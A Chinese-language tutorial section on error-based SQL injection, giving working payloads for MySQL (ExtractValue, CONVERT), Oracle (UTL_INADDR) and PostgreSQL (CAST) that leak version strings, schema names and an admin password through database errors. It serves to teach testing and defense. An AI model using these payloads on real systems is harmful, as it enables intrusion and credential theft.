## 基于错误的 SQL 注入

基于错误的 SQL 注入涉及执行特定操作以强制触发数据库服务器的错误消息。这里的关键是尝试从数据库中提取一些数据并将其包含在显示在错误消息中。通过分析这些错误消息，可直接得到或推断各种敏感数据。

在我们之前的示例中，我们使用 UNION 语句提取数据，这需要使用 `ORDER BY` 或 `GROUP BY` 子句来提取 SELECT 语句中的列数。

在除 MySQL 错误外没有其他输出的情况下，你可以通过错误强制数据提取。

### ExtractValue 函数

`ExtractValue()` 函数在无法解析提供给它的 XML 数据时会生成错误。这可以包括 SQL 查询的评估结果，该结果嵌入到产生的错误消息中。

为了确保 `ExtractValue()` 函数始终触发错误，我们将传递一个字符（如 `0x7E`，相当于符号 `~`）。这将被视为格式错误的输入，导致数据库生成详细的错误消息。

注意：在 SQL 注入中使用 `ExtractValue()` 函数的此技术不要求目标数据库是 XML 数据库或存储 XML 格式的数据。

让我们看一些查询：

**提取数据库版本**
```sql
'1 AND extractvalue(1, CONCAT(0x7e, (SELECT version()), 0x7e)); --
```

**提取表名**
```sql
'1 AND extractvalue(rand(), concat(0x7e, (SELECT concat(0x7e, schema_name) FROM information_schema.schemata LIMIT 0, 1))); --
```

**从 information_schema 提取特定表名**
```sql
'1 AND extractvalue(rand(), concat(0x3a, (SELECT concat(0x7e, TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="users" LIMIT 0,1))); --
```

注意：此技术仅在 MySQL 5.1 或更高版本上有效。此外，结合 `LIMIT` 函数可以提取底层数据库的特定数据段，因为它有助于控制查询返回的数据量。

### CONVERT 函数

例如，我们可以在 MySQL 中使用 `CONVERT()` 函数诱导错误：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
UNION SELECT 1,
CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE); –-
```

`CONVERT(VALUE, FORMAT)` 函数尝试将 `VALUE` 转换为 `FORMAT` 指定的格式。因此，此查询将强制数据库将 admin 的密码转换为日期格式，有时会导致数据库抛出像这样的描述性错误：

```log
Conversion failed when trying to convert "t5dJ12rp$fMDEbSWz" to data type "date".
```

在此示例中，数据库指出它未能将字符串值 `"t5dJ12rp$fMDEbSWz"` （admin 账户的密码）转换为日期格式。通过显示描述性错误消息，数据库意外地向外界泄露了敏感信息。

### 示例：Oracle

假设使用以下 SQL 查询：

```sql
SELECT * FROM products WHERE id_product=$id_product
```

同时假设执行上述查询的脚本请求：

`https://www.example.com/product.php?id=10`

恶意请求将是（例如 Oracle 10g）：

`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

在此示例中，测试人员将值 10 与函数 `UTL_INADDR.GET_HOST_NAME` 的结果连接。此 Oracle 函数将尝试返回传递给它的参数的主机名，该参数是另一个查询，即用户名。当数据库查找具有用户数据库名称的主机名时，它将失败并返回如下错误消息：

`ORA-292257: host SCOTT unknown`

然后测试人员可以操纵传递给 GET_HOST_NAME() 函数的参数，结果将显示在错误消息中。

### 示例：PostgreSQL

它允许你将一种数据类型转换为另一种数据类型。例如：

```sql
$input = 'x' AND 1=CAST((SELECT 'test') AS int) --
```

通常，你试图读取的数据是字符串。尝试将其转换为不兼容的数据类型（如 `int`）可能会导致类似以下的错误：

```log
ERROR: invalid input syntax for type integer: "test"
```

> 需基于转换后的类型构建有效上下文使得语句可执行到类型转换处，之后再触发类型转换时的错误。此处类型转换后类型为 int，构造 int 的上下文：使用布尔条件的数值比较以通过初步语法检测
